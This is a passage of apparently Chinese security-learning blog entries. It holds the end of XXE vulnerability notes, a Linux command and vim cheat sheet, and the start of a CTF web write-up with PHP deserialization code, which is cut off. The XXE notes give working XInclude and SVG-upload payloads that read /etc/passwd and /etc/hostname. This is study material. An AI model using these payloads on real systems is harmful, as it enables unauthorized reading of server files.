<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ROUTEROS"><figure class="iseeu highlight /routeros"><table><tr><td class="code"><pre><span class="line">&lt;foo xmlns:<span class="attribute">xi</span>=<span class="string">&quot;http://www.w3.org/2001/XInclude&quot;</span>&gt;</span><br><span class="line">&lt;xi:include <span class="attribute">parse</span>=<span class="string">&quot;text&quot;</span> <span class="attribute">href</span>=<span class="string">&quot;file:///etc/passwd&quot;</span>/&gt;&lt;/foo&gt;</span><br></pre></td></tr></table></figure></div>
<p>XInclude 是 W3C 标准，允许 XML 文档包含其他资源（本地文件、远程 URL 等）的内容。<br>parse&#x3D;”text”：将目标资源内容视为纯文本（而非 XML），直接嵌入当前文档。<br>href：指定要包含的资源路径（如 file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd）。<br><img src="https://pic1.imgdb.cn/item/67c13026d0e0a243d407bbed.png"><br>比如这里用户可以输入的是productId，就在这里插入XInclude，默认情况下， XInclude 会尝试将包含的文档解析为 XML。由于 &#x2F;etc&#x2F;passwd 不是有效的 XML，因此需要向 XInclude 指令添加额外的属性来更改此行为。这里就是指定<code>parse=&quot;text&quot;</code>将目标文件视为纯文本而非 XML</p>
<h4 id="通过文件上传进行-XXE-攻击"><a href="#通过文件上传进行-XXE-攻击" class="headerlink" title="通过文件上传进行 XXE 攻击"></a>通过文件上传进行 XXE 攻击</h4><p>一些应用程序允许用户上传文件，然后在服务器端进行处理。一些常见的文件格式使用 XML 或包含 XML 子组件。基于 XML 的格式的示例包括办公文档格式（如 DOCX）和图像格式（如 SVG）。</p>
<p>例如，应用程序可能允许用户上传图片，并在上传后在服务器上处理或验证这些图片。即使应用程序希望接收 PNG 或 JPEG 等格式，所使用的图像处理库也可能支持 SVG 图像。由于 SVG 格式使用 XML，攻击者可以提交恶意的 SVG 图像，从而达到 XXE 漏洞的隐藏攻击面。</p>
<p>payload:</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="XML"><figure class="iseeu highlight /xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> standalone=<span class="string">&quot;yes&quot;</span>?&gt;</span><span class="meta">&lt;!DOCTYPE <span class="keyword">test</span> [ <span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///etc/hostname&quot;</span> &gt;</span> ]&gt;</span><span class="tag">&lt;<span class="name">svg</span> <span class="attr">width</span>=<span class="string">&quot;128px&quot;</span> <span class="attr">height</span>=<span class="string">&quot;128px&quot;</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.w3.org/2000/svg&quot;</span> <span class="attr">xmlns:xlink</span>=<span class="string">&quot;http://www.w3.org/1999/xlink&quot;</span> <span class="attr">version</span>=<span class="string">&quot;1.1&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">text</span> <span class="attr">font-size</span>=<span class="string">&quot;16&quot;</span> <span class="attr">x</span>=<span class="string">&quot;0&quot;</span> <span class="attr">y</span>=<span class="string">&quot;16&quot;</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">text</span>&gt;</span><span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span><br></pre></td></tr></table></figure></div>
<p><img src="https://pic1.imgdb.cn/item/67c1338bd0e0a243d407bfff.png"><br>这里就是在上传头像这里支持svg文件，传入payload之后，就能在评论区看到自己的头像了，头像丽的内容就是&#x2F;etc&#x2F;hostname了<br><img src="https://pic1.imgdb.cn/item/67c133f0d0e0a243d407c014.png"></p>
<h4 id="通过修改内容类型进行-XXE-攻击"><a href="#通过修改内容类型进行-XXE-攻击" class="headerlink" title="通过修改内容类型进行 XXE 攻击"></a>通过修改内容类型进行 XXE 攻击</h4><p>大多数 POST 请求使用由 HTML 表单生成的默认内容类型，例如 application&#x2F;x-www-form-urlencoded 。一些网站希望接收这种格式的请求，但也能容忍其他内容类型，包括 XML。<br>正常请求的内容</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="HTTP"><figure class="iseeu highlight /http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/action</span> <span class="meta">HTTP/1.0</span></span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>7</span><br><span class="line"></span><br><span class="line"><span class="language-abnf"><span class="attribute">foo</span><span class="operator">=</span>bar</span></span><br></pre></td></tr></table></figure></div>
<p>可能能够提交以下请求，并获得相同的结果：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="HTTP"><figure class="iseeu highlight /http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/action</span> <span class="meta">HTTP/1.0</span></span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>text/xml</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>52</span><br><span class="line"></span><br><span class="line"><span class="language-xml"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span><span class="tag">&lt;<span class="name">foo</span>&gt;</span>bar<span class="tag">&lt;/<span class="name">foo</span>&gt;</span></span></span><br></pre></td></tr></table></figure></div>
<p>如果应用程序容忍消息正文中包含 XML 的请求，并将正文内容解析为 XML，那么只需重新格式化请求以使用 XML 格式即可到达隐藏的 XXE 攻击面。</p>
<p>以上就是所有关于xxe漏洞的内容了，更多技巧还需要在做题或者实战中学习。</p>
]]></content>
      <categories>
        <category>漏洞</category>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>web</tag>
        <tag>笔记</tag>
        <tag>漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title>linux基础指令笔记</title>
    <url>/posts/11168.html</url>
    <content><![CDATA[<p>linux基础指令学习笔记</p>
<span id="more"></span>
<p>⚠️本篇博客只是我刚学习linux指令时的笔记，只用来自己记录</p>
<h1 id="Linux-系统指令"><a href="#Linux-系统指令" class="headerlink" title="Linux 系统指令"></a>Linux 系统指令</h1><h2 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h2><ul>
<li><a href="#linux-%E7%B3%BB%E7%BB%9F%E6%8C%87%E4%BB%A4">Linux 系统指令</a><ul>
<li><a href="#%E7%9B%AE%E5%BD%95">目录</a></li>
<li><a href="#%E6%96%87%E4%BB%B6%E5%9F%BA%E7%A1%80%E6%93%8D%E4%BD%9C">文件基础操作</a><ul>
<li><a href="#%E6%A0%B8%E5%BF%83%E6%8C%87%E4%BB%A4">核心指令</a><ul>
<li><a href="#%E6%96%87%E4%BB%B6%E7%AE%A1%E7%90%86">文件管理</a></li>
<li><a href="#%E5%86%85%E5%AE%B9%E5%A4%84%E7%90%86">内容处理</a></li>
<li><a href="#%E6%9D%83%E9%99%90%E7%AE%A1%E7%90%86">权限管理</a></li>
<li><a href="#%E6%9D%83%E9%99%90%E4%BF%AE%E6%94%B9">权限修改</a></li>
</ul>
</li>
<li><a href="#shell%E8%84%9A%E6%9C%AC">shell脚本</a></li>
<li><a href="#vim-%E5%9F%BA%E7%A1%80">vim 基础</a><ul>
<li><a href="#%E8%BF%9B%E5%85%A5%E9%80%80%E5%87%BA%E7%BC%96%E8%BE%91%E6%A8%A1%E5%BC%8F">进入&#x2F;退出编辑模式</a></li>
<li><a href="#%E7%A7%BB%E5%8A%A8%E5%85%89%E6%A0%87">移动光标</a></li>
<li><a href="#%E5%A4%8D%E5%88%B6%E5%89%AA%E5%88%87%E7%B2%98%E8%B4%B4">复制、剪切、粘贴</a></li>
<li><a href="#%E6%92%A4%E9%94%80--%E6%81%A2%E5%A4%8D">撤销 &amp; 恢复</a></li>
<li><a href="#%E4%BB%A3%E7%A0%81%E7%BC%A9%E8%BF%9B">代码缩进</a></li>
<li><a href="#%E7%AA%97%E5%8F%A3--%E6%A0%87%E7%AD%BE%E7%AE%A1%E7%90%86">窗口 &amp; 标签管理</a></li>
<li><a href="#%E7%AA%97%E5%8F%A3%E5%AF%B9%E9%BD%90">窗口对齐</a></li>
<li><a href="#vim-%E9%85%8D%E7%BD%AE">Vim 配置</a></li>
<li><a href="#g%E7%BC%96%E8%AF%91">g++编译</a></li>
</ul>
</li>
<li><a href="#%E6%8F%92%E4%BB%B6%E7%AE%A1%E7%90%86">插件管理</a></li>
</ul>
</li>
</ul>
</li>
</ul>
<hr>
<h2 id="文件基础操作"><a href="#文件基础操作" class="headerlink" title="文件基础操作"></a>文件基础操作</h2><h3 id="核心指令"><a href="#核心指令" class="headerlink" title="核心指令"></a>核心指令</h3><h4 id="文件管理"><a href="#文件管理" class="headerlink" title="文件管理"></a>文件管理</h4><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">ls</span>          <span class="comment"># 列出目录内容</span></span><br><span class="line"><span class="built_in">ls</span> -l       <span class="comment"># 长格式显示（包含权限信息）</span></span><br><span class="line"><span class="built_in">ls</span> -a       <span class="comment"># 显示隐藏文件</span></span><br><span class="line"><span class="built_in">cd</span> ~        <span class="comment"># 返回用户目录</span></span><br><span class="line"><span class="built_in">pwd</span>         <span class="comment"># 显示当前路径</span></span><br><span class="line"><span class="built_in">cat</span> file    <span class="comment"># 查看文件内容</span></span><br><span class="line"><span class="built_in">cp</span> src.txt dest/          <span class="comment"># 复制文件</span></span><br><span class="line"><span class="built_in">cp</span> -R <span class="built_in">dir</span>/ dest/          <span class="comment"># 复制目录需要-R参数</span></span><br><span class="line"><span class="built_in">mv</span> old.txt new.txt        <span class="comment"># 重命名文件</span></span><br><span class="line"><span class="built_in">mkdir</span> project             <span class="comment"># 创建目录</span></span><br><span class="line"><span class="built_in">rmdir</span> empty_dir           <span class="comment"># 删除空目录</span></span><br><span class="line"><span class="built_in">rm</span> -rf temp/              <span class="comment">#强制递归删除目录</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 处理含空格文件名</span></span><br><span class="line"><span class="built_in">touch</span> <span class="string">&quot;file name.txt&quot;</span>     <span class="comment"># 创建带空格文件</span></span><br><span class="line"><span class="built_in">ls</span> file\ name.txt         <span class="comment"># 转义空格查看</span></span><br></pre></td></tr></table></figure></div>
<h4 id="内容处理"><a href="#内容处理" class="headerlink" title="内容处理"></a>内容处理</h4><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="STAN"><figure class="iseeu highlight /stan"><table><tr><td class="code"><pre><span class="line">wc -l access.<span class="built_in">log</span>          <span class="comment"># 统计行数</span></span><br><span class="line">diff file1 file2          <span class="comment"># 文件差异对比</span></span><br><span class="line"><span class="built_in">head</span> -n <span class="number">20</span> <span class="built_in">log</span>.txt        <span class="comment"># 查看前20行</span></span><br><span class="line"><span class="built_in">tail</span> -f service.<span class="built_in">log</span>       <span class="comment"># 实时追踪日志更新</span></span><br><span class="line">grep <span class="string">&quot;error&quot;</span> *.<span class="built_in">log</span>        <span class="comment"># 多文件关键词搜索</span></span><br></pre></td></tr></table></figure></div>
<h4 id="权限管理"><a href="#权限管理" class="headerlink" title="权限管理"></a>权限管理</h4><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="CRMSH"><figure class="iseeu highlight /crmsh"><table><tr><td class="code"><pre><span class="line">-rw-r--r-- <span class="number">1</span> <span class="keyword">user</span> <span class="title">group</span> <span class="number">4096</span> Jan <span class="number">1</span> <span class="number">00</span>:<span class="number">00</span> file.txt</span><br><span class="line"><span class="comment"># 第1位：文件类型（-普通文件，d目录）</span></span><br><span class="line"><span class="comment"># 2-4位：用户权限（rw-）</span></span><br><span class="line"><span class="comment"># 5-7位：组权限（r--）</span></span><br><span class="line"><span class="comment"># 8-10位：其他用户权限（r--）</span></span><br></pre></td></tr></table></figure></div>
<h4 id="权限修改"><a href="#权限修改" class="headerlink" title="权限修改"></a>权限修改</h4><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">chmod</span> u+x script.sh      <span class="comment"># 添加用户执行权限</span></span><br><span class="line"><span class="built_in">chmod</span> go-w secret.txt    <span class="comment"># 移除组和其他写权限</span></span><br><span class="line"><span class="built_in">chmod</span> 755 executable     <span class="comment"># 数字模式权限设置（rwxr-xr-x）</span></span><br><span class="line">chomd 600  id_rsa        <span class="comment"># 仅文件所有者可读写，其他人无权限</span></span><br></pre></td></tr></table></figure></div>
<h3 id="shell脚本"><a href="#shell脚本" class="headerlink" title="shell脚本"></a>shell脚本</h3><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="comment"># Shell 脚本基础示例</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 变量赋值与引用</span></span><br><span class="line">VAR=<span class="string">&quot;Hello World&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;变量内容：<span class="variable">$VAR</span>&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 读取用户输入</span></span><br><span class="line"><span class="built_in">read</span> -p <span class="string">&quot;请输入你的名字：&quot;</span> name</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;你好，<span class="variable">$name</span>！&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 命令行参数处理</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;执行脚本名：<span class="variable">$0</span>&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;第一个参数：<span class="variable">$1</span>&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;参数个数：<span class="variable">$#</span>&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;所有参数：<span class="variable">$@</span>&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 条件判断</span></span><br><span class="line"><span class="keyword">if</span> [ <span class="variable">$#</span> -eq 0 ]; <span class="keyword">then</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;错误：缺少参数！&quot;</span></span><br><span class="line"><span class="keyword">elif</span> [ -d <span class="string">&quot;<span class="variable">$1</span>&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$1</span> 是目录&quot;</span></span><br><span class="line"><span class="keyword">elif</span> [ -f <span class="string">&quot;<span class="variable">$1</span>&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$1</span> 是普通文件&quot;</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;未知文件类型&quot;</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 逻辑判断（&amp;&amp; || 逻辑运算）</span></span><br><span class="line">[ -n <span class="string">&quot;<span class="variable">$name</span>&quot;</span> ] &amp;&amp; <span class="built_in">echo</span> <span class="string">&quot;你输入了名字：<span class="variable">$name</span>&quot;</span> || <span class="built_in">echo</span> <span class="string">&quot;未输入名字&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 循环示例</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> &#123;1..5&#125;; <span class="keyword">do</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;for 循环：<span class="variable">$i</span>&quot;</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># while 循环</span></span><br><span class="line">count=1</span><br><span class="line"><span class="keyword">while</span> [ <span class="variable">$count</span> -le 3 ]; <span class="keyword">do</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;while 循环：<span class="variable">$count</span>&quot;</span></span><br><span class="line">    count=$((count + <span class="number">1</span>))</span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 读取文件（假设 input.txt 存在）</span></span><br><span class="line"><span class="keyword">if</span> [ -f <span class="string">&quot;input.txt&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">    <span class="keyword">while</span> <span class="built_in">read</span> -r line; <span class="keyword">do</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;处理内容：<span class="variable">$line</span>&quot;</span></span><br><span class="line">    <span class="keyword">done</span> &lt; input.txt</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;文件 input.txt 不存在，跳过读取&quot;</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 运算表达式</span></span><br><span class="line"><span class="built_in">sum</span>=$((<span class="number">3</span> + <span class="number">5</span>))            <span class="comment"># 整数运算</span></span><br><span class="line">mul=$(<span class="built_in">expr</span> 3 \* 5)        <span class="comment"># expr 计算</span></span><br><span class="line">mod=$(<span class="built_in">expr</span> 10 % 3)        <span class="comment"># 取模运算</span></span><br><span class="line">div=$(<span class="built_in">echo</span> <span class="string">&quot;scale=2; 3/7&quot;</span> | bc)  <span class="comment"># 浮点运算</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 结果输出</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;整数求和：<span class="variable">$sum</span>&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;乘法结果：<span class="variable">$mul</span>&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;取模结果：<span class="variable">$mod</span>&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;浮点除法结果：<span class="variable">$div</span>&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 比较符</span></span><br><span class="line">1. 字符比较</span><br><span class="line">- 相等：[ <span class="string">&quot;<span class="variable">$str1</span>&quot;</span> = <span class="string">&quot;<span class="variable">$str2</span>&quot;</span> ]</span><br><span class="line">- 不等：[ <span class="string">&quot;<span class="variable">$str1</span>&quot;</span> != <span class="string">&quot;<span class="variable">$str2</span>&quot;</span> ]</span><br><span class="line">- 空字符串：[ -z <span class="string">&quot;<span class="variable">$str</span>&quot;</span> ]</span><br><span class="line">- 非空字符串：[ -n <span class="string">&quot;<span class="variable">$str</span>&quot;</span> ]</span><br><span class="line">- 字典顺序比较：[ <span class="string">&quot;<span class="variable">$str1</span>&quot;</span> \&gt; <span class="string">&quot;<span class="variable">$str2</span>&quot;</span> ] 或 [[ <span class="string">&quot;<span class="variable">$str1</span>&quot;</span> &gt; <span class="string">&quot;<span class="variable">$str2</span>&quot;</span> ]]</span><br><span class="line"></span><br><span class="line">2. 数字比较</span><br><span class="line">- 相等：[ <span class="string">&quot;<span class="variable">$num1</span>&quot;</span> -eq <span class="string">&quot;<span class="variable">$num2</span>&quot;</span> ]</span><br><span class="line">- 不等：[ <span class="string">&quot;<span class="variable">$num1</span>&quot;</span> -ne <span class="string">&quot;<span class="variable">$num2</span>&quot;</span> ]</span><br><span class="line">- 大于：[ <span class="string">&quot;<span class="variable">$num1</span>&quot;</span> -gt <span class="string">&quot;<span class="variable">$num2</span>&quot;</span> ]</span><br><span class="line">- 小于：[ <span class="string">&quot;<span class="variable">$num1</span>&quot;</span> -lt <span class="string">&quot;<span class="variable">$num2</span>&quot;</span> ]</span><br><span class="line">- 大于或等于：[ <span class="string">&quot;<span class="variable">$num1</span>&quot;</span> -ge <span class="string">&quot;<span class="variable">$num2</span>&quot;</span> ]</span><br><span class="line">- 小于或等于：[ <span class="string">&quot;<span class="variable">$num1</span>&quot;</span> -le <span class="string">&quot;<span class="variable">$num2</span>&quot;</span> ]</span><br><span class="line"></span><br><span class="line">3. 简化数字比较</span><br><span class="line">使用 (( )) 比较数字：</span><br><span class="line">- 相等：(( num1 == num2 ))</span><br><span class="line">- 大于：(( num1 &gt; num2 ))</span><br><span class="line">- 小于：(( num1 &lt; num2 ))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 函数示例</span></span><br><span class="line"><span class="function"><span class="title">greet</span></span>() &#123;</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;欢迎，<span class="variable">$1</span>！&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">greet <span class="string">&quot;Shell 学习者&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取当前日期</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;当前时间：<span class="subst">$(date <span class="string">&quot;+%Y-%m-%d %H:%M:%S&quot;</span>)</span>&quot;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<h3 id="vim-基础"><a href="#vim-基础" class="headerlink" title="vim 基础"></a>vim 基础</h3><h4 id="进入-退出编辑模式"><a href="#进入-退出编辑模式" class="headerlink" title="进入&#x2F;退出编辑模式"></a>进入&#x2F;退出编辑模式</h4><ul>
<li>按 <code>i</code> 进入编辑模式，<code>ESC</code> 退出编辑模式，返回命令模式。  </li>
<li>在命令模式下：<ul>
<li><code>:wq</code> <strong>保存并退出</strong>  </li>
<li><code>:q!</code> <strong>不保存退出</strong></li>
</ul>
</li>
</ul>
<h4 id="移动光标"><a href="#移动光标" class="headerlink" title="移动光标"></a>移动光标</h4><ul>
<li><code>HJKL</code> 在命令模式下分别表示：<ul>
<li><code>H</code> 左</li>
<li><code>J</code> 下</li>
<li><code>K</code> 上</li>
<li><code>L</code> 右</li>
</ul>
</li>
<li><code>w</code> 按单词向前移动光标，<code>b</code> 反向移动  </li>
<li><mark>Ctrl + F</mark> (<strong>Foreword</strong>) <strong>向下翻页</strong> (<code>PageDown</code>)  </li>
<li><mark>Ctrl + B</mark> (<strong>Backwards</strong>) <strong>向上翻页</strong> (<code>PageUp</code>)  </li>
<li><code>数字 + gg</code> 跳转到指定行  </li>
<li><code>数字 + j/k</code> 跳转多行  </li>
<li><code>/关键词</code> 搜索关键字，<code>n</code> 下一个，<code>Shift + N</code> 上一个</li>
</ul>
<h4 id="复制、剪切、粘贴"><a href="#复制、剪切、粘贴" class="headerlink" title="复制、剪切、粘贴"></a>复制、剪切、粘贴</h4><ul>
<li><code>cc</code> <strong>剪切一行</strong>（可加数字，如 <code>c2c</code> 剪切两行）  </li>
<li><code>yy</code> <strong>复制当前行</strong>  </li>
<li><code>p</code> <strong>粘贴</strong>  </li>
<li>在命令模式下：<ul>
<li><code>:%y</code> <strong>复制整个文件</strong>  </li>
<li><code>ggVG</code> <strong>选中全部文本</strong></li>
</ul>
</li>
</ul>
<h4 id="撤销-恢复"><a href="#撤销-恢复" class="headerlink" title="撤销 &amp; 恢复"></a>撤销 &amp; 恢复</h4><ul>
<li><code>u</code> <strong>撤销</strong>（Undo）  </li>
<li><code>Ctrl + R</code> <strong>恢复撤销的操作</strong>（Redo）</li>
</ul>
<h4 id="代码缩进"><a href="#代码缩进" class="headerlink" title="代码缩进"></a>代码缩进</h4><ul>
<li><code>v</code> 进入 <strong>可视模式</strong>，选中文本后：<ul>
<li><code>&lt;</code> <strong>减少缩进</strong>  </li>
<li><code>&gt;</code> <strong>增加缩进</strong>  </li>
<li><code>+y</code> <strong>复制选中内容</strong></li>
</ul>
</li>
</ul>
<h4 id="窗口-标签管理"><a href="#窗口-标签管理" class="headerlink" title="窗口 &amp; 标签管理"></a>窗口 &amp; 标签管理</h4><ul>
<li><code>:tabnew [文件]</code> <strong>新建标签页</strong>  </li>
<li><code>:tabc</code> <strong>关闭当前标签</strong>  </li>
<li><code>:tabo</code> <strong>关闭其他所有标签</strong>  </li>
<li><code>:tabs</code> <strong>查看所有打开的标签</strong>  </li>
<li><code>:tabp / :tabn</code> <strong>切换前&#x2F;后一个标签</strong>  </li>
<li>标准模式下：<ul>
<li><code>gt</code> <strong>下一个 tab</strong>  </li>
<li><code>gT</code> <strong>上一个 tab</strong></li>
</ul>
</li>
<li><code>R</code> <strong>刷新 NerdTree</strong></li>
</ul>
<h4 id="窗口对齐"><a href="#窗口对齐" class="headerlink" title="窗口对齐"></a>窗口对齐</h4><ul>
<li><code>zz</code> <strong>让光标所在行位于屏幕中间</strong>  </li>
<li><code>zt</code> <strong>让光标所在行置顶</strong>  </li>
<li><code>zb</code> <strong>让光标所在行置底</strong>  </li>
<li><code>Ctrl + E</code> <strong>向下滚动一行</strong>  </li>
<li><code>Ctrl + Y</code> <strong>向上滚动一行</strong></li>
</ul>
<h4 id="Vim-配置"><a href="#Vim-配置" class="headerlink" title="Vim 配置"></a>Vim 配置</h4><ul>
<li>在命令模式下输入：<ul>
<li><code>:syntax on</code> <strong>开启代码高亮</strong>  </li>
<li><code>:set number</code> <strong>显示行号</strong></li>
</ul>
</li>
<li><strong>全局生效</strong>：编辑 <code>~/.vimrc</code> 文件，添加：<br>syntax on<br>set number</li>
</ul>
<h4 id="g-编译"><a href="#g-编译" class="headerlink" title="g++编译"></a>g++编译</h4><p>默认编译： <code>g++ [选项] -o 生成文件名 源文件.cpp</code>  如果不加 -o 选项，默认会生成 a.out<br>使用c++11标准： <code>g++ -std=c++11 file.cpp</code></p>
<h3 id="插件管理"><a href="#插件管理" class="headerlink" title="插件管理"></a>插件管理</h3><p>安装Vim-Plug（插件管理器）：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="VIM"><figure class="iseeu highlight /vim"><table><tr><td class="code"><pre><span class="line">curl -fLo ~/.<span class="keyword">vim</span>/autoload/plug.<span class="keyword">vim</span> --create-dirs \</span><br><span class="line">     https://raw.githubusercontent.<span class="keyword">com</span>/junegunn/<span class="keyword">vim</span>-plug/master/plug.<span class="keyword">vim</span></span><br></pre></td></tr></table></figure></div>

<p>安装插件： 在 ~&#x2F;.vimrc 添加</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="LEAF"><figure class="iseeu highlight /leaf"><table><tr><td class="code"><pre><span class="line">call plug<span class="punctuation">#</span><span class="keyword">begin</span><span class="params">(&#x27;~<span class="operator">/</span>.<span class="variable">vim</span><span class="operator">/</span><span class="variable">plugged</span>&#x27;)</span></span><br><span class="line">Plug &#x27;preservim/nerdtree&#x27;</span><br><span class="line">Plug &#x27;junegunn/fzf&#x27;</span><br><span class="line">call plug<span class="punctuation">#</span><span class="keyword">end</span><span class="params">()</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<p>插件指令：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ELIXIR"><figure class="iseeu highlight /elixir"><table><tr><td class="code"><pre><span class="line"><span class="symbol">:PlugInstall</span>        <span class="comment"># 安装插件（从 ~/.vimrc 配置的源下载并安装插件）</span></span><br><span class="line"><span class="symbol">:PlugUpdate</span>         <span class="comment"># 更新已安装的插件</span></span><br><span class="line"><span class="symbol">:PlugUpgrade</span>        <span class="comment"># 更新 Vim-Plug 本身</span></span><br><span class="line"><span class="symbol">:PlugClean</span>          <span class="comment"># 清理无用的插件（删除未在 ~/.vimrc 配置中的插件）</span></span><br><span class="line"><span class="symbol">:PlugStatus</span>         <span class="comment"># 显示已安装插件的状态</span></span><br><span class="line"><span class="symbol">:PlugDiff</span>           <span class="comment"># 显示本地插件与远程仓库的差异</span></span><br></pre></td></tr></table></figure></div>]]></content>
      <categories>
        <category>linux</category>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>笔记</tag>
        <tag>linux</tag>
        <tag>操作系统</tag>
        <tag>shell</tag>
      </tags>
  </entry>
  <entry>
    <title>UUCTF_2022新生赛(web)WP</title>
    <url>/posts/18581.html</url>
    <content><![CDATA[<p>UUCTF_2022新生赛web方向WP</p>
<span id="more"></span>

<h1 id="ezpop"><a href="#ezpop" class="headerlink" title="ezpop"></a>ezpop</h1><p>题目</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//flag in flag.php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UUCTF</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>,<span class="variable">$key</span>,<span class="variable">$basedata</span>,<span class="variable">$ob</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;name=<span class="variable">$str</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;key===<span class="string">&quot;UUCTF&quot;</span>)&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;ob=<span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">base64_decode</span>(<span 